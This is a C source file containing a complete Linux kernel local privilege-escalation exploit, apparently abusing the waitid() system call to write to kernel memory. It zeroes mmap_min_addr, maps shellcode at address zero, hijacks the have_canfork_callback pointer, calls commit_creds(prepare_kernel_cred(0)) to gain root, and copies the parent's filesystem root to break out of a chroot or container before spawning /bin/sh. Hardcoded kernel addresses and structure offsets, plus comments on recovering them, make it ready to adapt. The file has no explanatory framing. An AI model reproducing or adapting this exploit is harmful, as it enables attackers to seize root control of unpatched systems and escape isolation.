#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>

//echo 0 > /proc/sys/kernel/kptr_restrict
//cat /proc/kallsyms
#define ADDR_dac_mmap_min_addr      0xffffffff81c3df20
#define ADDR_have_canfork_callback  0xffffffff81c76902
#define ADDR_prepare_kernel_cred    0xffffffff8105e4b0
#define ADDR_commit_creds           0xffffffff8105e120
#define ADDR_set_fs_root            0xffffffff811627c0
#define ADDR_copy_fs_struct         0xffffffff81162ac0
#define ADDR_current_task           0x000000000000c380

//gdb vmlinux
//(gdb) p &(((struct task_struct *)0)->fs)
#define TASK_FS_OFFSET      0x718
//(gdb) p &(((struct task_struct *)0)->parent)
#define TASK_PARENT_OFFSET  0x520
//(gdb) p &(((struct fs_struct *)0)->root)
#define FS_ROOT_OFFSET      0x18

#define LOOKUP_FOLLOW       0x0001
#define LOOKUP_DIRECTORY    0x0002
#define LOOKUP_ROOT         0x2000

struct cred;
struct task_struct;
struct path;
struct fs_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
typedef void (*set_fs_root_t)(struct fs_struct *fs, const struct path *path) __attribute__((regparm(3)));
typedef struct fs_struct * (*copy_fs_struct_t)(struct fs_struct *old) __attribute__((regparm(3)));
typedef unsigned short u16;
/*
prepare_kernel_cred_t   prepare_kernel_cred = (prepare_kernel_cred_t)ADDR_prepare_kernel_cred;
commit_creds_t          commit_creds = (commit_creds_t)ADDR_prepare_kernel_cred;
set_fs_root_t           set_fs_root = (set_fs_root_t)ADDR_prepare_kernel_cred;
copy_fs_struct_t        copy_fs_struct = (copy_fs_struct_t)ADDR_copy_fs_struct;
u16                     *have_canfork_callback_p = (u16 *)ADDR_have_canfork_callback;*/

#define __stringify_1(x...) #x
#define __stringify(x...)   __stringify_1(x)
#define __percpu_seg        gs
#define __percpu_prefix     "%%"__stringify(__percpu_seg)":"
#define __percpu_arg(x)     __percpu_prefix "%" #x

#define get_current ({ \
    void * pfo_ret__; \
    asm("movq "__percpu_arg(P1)",%0" : "=r" (pfo_ret__) : "p" (ADDR_current_task)); \
    pfo_ret__; \
})

int get_root()
{
    prepare_kernel_cred_t   prepare_kernel_cred = (prepare_kernel_cred_t)ADDR_prepare_kernel_cred;
    commit_creds_t          commit_creds = (commit_creds_t)ADDR_commit_creds;
    set_fs_root_t           set_fs_root = (set_fs_root_t)ADDR_set_fs_root;
    copy_fs_struct_t        copy_fs_struct = (copy_fs_struct_t)ADDR_copy_fs_struct;
    u16                     *have_canfork_callback_p = (u16 *)ADDR_have_canfork_callback;

    void *task;
    void *fs;
    void *path;
    void *parent;
    void *parentfs;

    //Get root
    commit_creds(prepare_kernel_cred(0));

    //Set have_canfork_callback back to its original value
    *have_canfork_callback_p = 2048;

    //Get rootfs
    task = get_current;
    parent = *(void **)(task + TASK_PARENT_OFFSET);
    parent = *(void **)(parent + TASK_PARENT_OFFSET);
    parentfs = *(void **)(parent + TASK_FS_OFFSET);
    *(void **)(task + TASK_FS_OFFSET) = copy_fs_struct(parentfs);

    return 0;
}

void get_shell()
{
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

int
main()
{
    long    ret;
    pid_t   pid;

    unsigned char shellcode[] = {
        0xFF, 0x24, 0x25, 0x08, 0x00, 0x00, 0x00, 0x00,
    };

    pid = fork();
    if (pid == 0) {
        sleep(1);
        return 0;
    } else if (pid < 0) {
        printf("[-] Failed to fork\n");
        return -1;
    }
    ret = syscall(__NR_waitid, P_ALL, 0, ADDR_dac_mmap_min_addr,
    			  WEXITED | WNOHANG | __WNOTHREAD, NULL);
    if (ret != 0) {
        printf("[-] Failed to change /proc/sys/vm/mmap_min_addr\n");
        return -1;
    }
    printf("[+] Changed /proc/sys/vm/mmap_min_addr to 0\n");

    if (mmap(0, 4096,
             PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED,
             -1, 0) == (char *)-1){
        printf("[-] Failed to mmap 0x0\n");
        return -1;
    }
    printf("[+] mmap 0x0\n");

    memcpy(0, shellcode, sizeof(shellcode));
    *(unsigned long*)sizeof(shellcode) = (unsigned long)get_root;
    printf("[+] Set shellcode to 0x0\n");

    pid = fork();
    if (pid == 0) {
        sleep(1);
        return 0;
    } else if (pid < 0) {
        printf("[-] Failed to fork\n");
        return -1;
    }
    ret = syscall(__NR_waitid, P_ALL, 0, ADDR_have_canfork_callback,
                  WEXITED | WSTOPPED | WCONTINUED, NULL);
    if (ret != 0) {
        printf("[-] Failed to change have_canfork_callback\n");
        return -1;
    }
    printf("[+] Changed have_canfork_callback\n");

    pid = fork();
    if (pid == 0) {
        return 0;
    } else if (pid < 0) {
        printf("[-] Failed to fork\n");
        return -1;
    }
    if (getuid() != 0) {
        printf("[-] Failed got root\n");
        return -1;
    }
    printf("[+] Got root and rootfs\n");

    get_shell();

    return 0;
}
